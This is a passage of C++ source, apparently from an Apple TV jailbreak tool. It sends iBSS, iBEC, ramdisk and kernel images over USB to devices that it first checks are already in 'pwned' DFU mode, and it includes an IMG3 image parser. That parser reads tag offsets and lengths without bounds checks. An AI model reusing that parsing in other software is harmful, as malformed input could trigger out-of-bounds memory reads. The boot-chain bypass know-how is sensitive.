        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        if (lockdownd_client_new_with_handshake(device, &client, "blackb0x") != LOCKDOWN_E_SUCCESS) {
            fprintf(stderr, "ERROR: Could not connect to lockdownd\n");
            idevice_free(device);
            return out;
        }
    }

    plist_t node = nullptr;
    if (lockdownd_get_value(client, nullptr, nullptr, &node) == LOCKDOWN_E_SUCCESS && node) {
        auto getString = [&](const char* key) -> std::string {
            plist_t item = plist_dict_get_item(node, key);
            if (!item || plist_get_node_type(item) != PLIST_STRING) return "";
            char* s = nullptr;
            plist_get_string_val(item, &s);
            std::string result = s ? s : "";
            free(s);
            return result;
        };

        out.productType = getString("ProductType");
        out.productVersion = getString("ProductVersion");
        out.buildVersion = getString("BuildVersion");
        out.uniqueDeviceID = getString("UniqueDeviceID");

        plist_t chipId = plist_dict_get_item(node, "UniqueChipID");
        if (chipId) {
            uint64_t u = 0;
            plist_get_uint_val(chipId, &u);
            out.uniqueChipID = u;
        }

        out.valid = true;
        plist_free(node);
    }

    lockdownd_client_free(client);
    idevice_free(device);

    return out;
}

// ---------------------------------------------------------------------------
// iRecovery (iBSS, iBEC, Ramdisk, Kernel, DeviceTree)
// ---------------------------------------------------------------------------

// Status for all send*() calls is reported by the caller (Cli.cpp's
// sendComponentsToDevice(), which already knows exactly when each one
// starts and what its result was) — these stay quiet on success and only
// report genuine, otherwise-unexplained failures.
int DeviceManager::sendiBSS(const std::string& iBSSpath, uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    if (!client) {
        return -1;
    }

    irecv_device_t device = nullptr;
    irecv_devices_get_device_by_client(client, &device);

    if (strstr(device->product_type, "AppleTV3,1")) {
        irecv_close(client);
        return sendiBSS_ATV31(ecid, iBSSpath.c_str());
    }

    if (strstr(device->product_type, "AppleTV3,2")) {
        irecv_close(client);
        return sendiBSS_ATV32(ecid, iBSSpath.c_str());
    }

    // AppleTV2,1
    irecv_error_t err = irecv_send_file(client, iBSSpath.c_str(), IRECV_SEND_OPT_DFU_NOTIFY_FINISH);
    irecv_close(client);
    return (err == IRECV_E_SUCCESS) ? 0 : -1;
}

int DeviceManager::sendiBEC(const std::string& iBECpath, uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    irecv_error_t err = irecv_send_file(client, iBECpath.c_str(), IRECV_SEND_OPT_DFU_NOTIFY_FINISH);
    irecv_close(client);
    sleep(2);
    return (err == IRECV_E_SUCCESS) ? 0 : -1;
}

int DeviceManager::sendRamdisk(const std::string& Ramdisk_Path, uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    irecv_send_file(client, Ramdisk_Path.c_str(), IRECV_SEND_OPT_DFU_NOTIFY_FINISH);
    irecv_send_command(client, "ramdisk");
    irecv_close(client);
    sleep(2);
    return 0;
}

int DeviceManager::sendKernelCache(const std::string& KernelCache_Path, uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    irecv_send_file(client, KernelCache_Path.c_str(), IRECV_SEND_OPT_DFU_NOTIFY_FINISH);
    irecv_send_command(client, "bootx");
    irecv_close(client);
    sleep(2);
    return 0;
}

int DeviceManager::sendDeviceTree(const std::string& DeviceTree_Path, uint64_t ecid) {
    irecv_client_t client = get_tv(ecid);
    irecv_send_file(client, DeviceTree_Path.c_str(), IRECV_SEND_OPT_DFU_NOTIFY_FINISH);
    irecv_send_command(client, "devicetree");
    irecv_close(client);
    sleep(2);
    return 0;
}

// ---------------------------------------------------------------------------
// AppleTV3,2 booting (soft DFU)
// ---------------------------------------------------------------------------

static int sendiBSS_ATV32(uint64_t ecid, const char* path) {
    irecv_client_t client = get_tv(ecid);
    if (!client) {
        return -1;
    }

    int handle = open(path, O_RDONLY);
    if (handle < 0) {
        fprintf(stderr, "Failed to open %s\n", path);
        return -1;
    }

    off_t buffer_size = lseek(handle, 0, SEEK_END);
    if (buffer_size <= 0) {
        fprintf(stderr, "iBSS file is empty: %s\n", path);
        close(handle);
        return -1;
    }

    unsigned char* buffer = (unsigned char*)malloc(buffer_size);
    if (!buffer) {
        close(handle);
        return -1;
    }

    if (pread(handle, buffer, buffer_size, 0) < 0) {
        fprintf(stderr, "Failed to read %s\n", path);
        free(buffer);
        close(handle);
        return -1;
    }

    int ret = boot_client(client, buffer, buffer_size);
    free(buffer);
    close(handle);
    return (ret == 0) ? 0 : 1;
}

// ---------------------------------------------------------------------------
// AppleTV3,1 booting
// ---------------------------------------------------------------------------

static int sendiBSS_ATV31(uint64_t ecid, const char* iBSSpath) {
    irecv_client_t client = get_tv(ecid);
    if (!client) return -1;

    FILE* iBSSfile = fopen(iBSSpath, "rb");
    if (!iBSSfile) {
        fprintf(stderr, "Failed to open %s\n", iBSSpath);
        return -1;
    }

    fseek(iBSSfile, 0, SEEK_END);
    long length = ftell(iBSSfile);
    fseek(iBSSfile, 0, SEEK_SET);

    void* buf = malloc(length);
    size_t nread = fread(buf, 1, length, iBSSfile);
    fclose(iBSSfile);
    (void)nread;

    int ret = boot_client(client, buf, length);
    free(buf);
    if (ret != 0) {
        return -1;
    }
    sleep(2);
    return 0;
}

static void send_progress(double progress) {
    if (progress < 0) return;
    if (progress > 100) progress = 100;
    if (DeviceManager::instance() && DeviceManager::instance()->sink().onProgress) {
        DeviceManager::instance()->sink().onProgress(progress);
    }
}

//** Thank You @dora2 for this below! **//

#define IMG3_HEADER     0x496d6733
#define ARMv7_VECTOR    0xEA00000E
#define IMG3_ILLB       0x696c6c62
#define IMG3_IBSS       0x69627373
#define IMG3_DATA       0x44415441
#define IMG3_KBAG       0x4B424147

typedef struct img3Tag {
    uint32_t magic;
    uint32_t totalLength;
    uint32_t dataLength;
} Img3RootHeader;

typedef struct Unparsed_KBAG_256 {
    uint32_t magic;
    uint32_t fullSize;
    uint32_t tagDataSize;
    uint32_t cryptState;
    uint32_t aesType;
    uint8_t encIV_start;
} UnparsedKbagAes256_t;

typedef struct img3File {
    uint32_t magic;
    uint32_t fullSize;
    uint32_t sizeNoPack;
    uint32_t sigCheckArea;
    uint32_t ident;
    struct img3Tag tags[];
} Img3Header;

static int send_data(irecv_client_t client, unsigned char* data, size_t size) {
    return irecv_usb_control_transfer(client, 0x21, 1, 0, 0, data, size, 100);
}

static int boot_client(irecv_client_t client, void* buf, size_t sz) {
    if (!client) {
        return -1;
    }

    const struct irecv_device_info* info = irecv_get_device_info(client);
    const char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if (!pwnd_str) {
        irecv_close(client);
        fprintf(stderr, "Device is not in pwned DFU mode.\n");
        return -1;
    }

    void* ibss;
    size_t ibss_sz;
    unsigned char blank[16];
    memset(blank, 0, 16);

    int ret = check_img3_file_format(client, buf, sz, &ibss, &ibss_sz);
    if (ret != 0) {
        irecv_close(client);
        return -1;
    }

    send_data(client, blank, 16);
    irecv_usb_control_transfer(client, 0x21, 1, 0, 0, nullptr, 0, 100);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);

    size_t len = 0;
    unsigned char* ibss_bytes = (unsigned char*)ibss;
    while (len < ibss_sz) {
        size_t size = ((ibss_sz - len) > 0x800) ? 0x800 : (ibss_sz - len);
        size_t sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, &ibss_bytes[len], size, 1000);
        if (sent != size) {
            free(ibss);
            return -1;
        }
        len += size;
        send_progress(((double)len / (double)ibss_sz) * 100);
    }
    free(ibss);

    irecv_usb_control_transfer(client, 0xA1, 2, 0xFFFF, 0, (unsigned char*)buf, 0, 100);

    irecv_close(client);
    return 0;
}

static int check_img3_file_format(irecv_client_t client, void* file, size_t sz, void** out, size_t* outsz) {
    (void)client;
    (void)sz;
    unsigned char* base = (unsigned char*)file;
    uint32_t Img3header_magic = *(uint32_t*)(base + offsetof(struct img3File, magic));

    switch (Img3header_magic) {
        case ARMv7_VECTOR:
            *out = malloc(sz);
            *outsz = sz;
            memcpy(*out, file, *outsz);
            return 0;

        case IMG3_HEADER: {
            uint32_t ibss_data_start = 0;
            uint32_t tag_header = 0;

            uint32_t img3_ident = *(uint32_t*)(base + offsetof(struct img3File, ident));
            if (img3_ident != IMG3_ILLB && img3_ident != IMG3_IBSS) {
                fprintf(stderr, "Invalid iBSS image.\n");
                return -1;
            }

            uint32_t img3_fullSize = *(uint32_t*)(base + offsetof(struct img3File, fullSize));
            uint32_t img3_sizeNoPack = *(uint32_t*)(base + offsetof(struct img3File, sizeNoPack));

            uint32_t next = img3_fullSize - img3_sizeNoPack;

            for (uint32_t next_tag = next; next_tag < img3_fullSize;) {
                uint32_t img3_tag_magic = *(uint32_t*)(base + next_tag + offsetof(struct img3Tag, magic));
                uint32_t img3_tag_totalLength = *(uint32_t*)(base + next_tag + offsetof(struct img3Tag, totalLength));
                uint32_t img3_tag_dataLength = *(uint32_t*)(base + next_tag + offsetof(struct img3Tag, dataLength));

                if (img3_tag_magic == IMG3_DATA) {
                    tag_header = img3_tag_magic;
                    *outsz = img3_tag_dataLength;
                    ibss_data_start = next_tag + offsetof(struct img3Tag, dataLength) + 4;
                }

                (void)IMG3_KBAG;
                next_tag += img3_tag_totalLength;
            }

            if (tag_header != IMG3_DATA) {
                fprintf(stderr, "Invalid iBSS image.\n");
                return -1;
            }

            *out = malloc(*outsz);
            memcpy(*out, base + ibss_data_start, *outsz);
            return 0;
        }

        default:
            fprintf(stderr, "Invalid iBSS image.\n");
            return -1;
    }
}
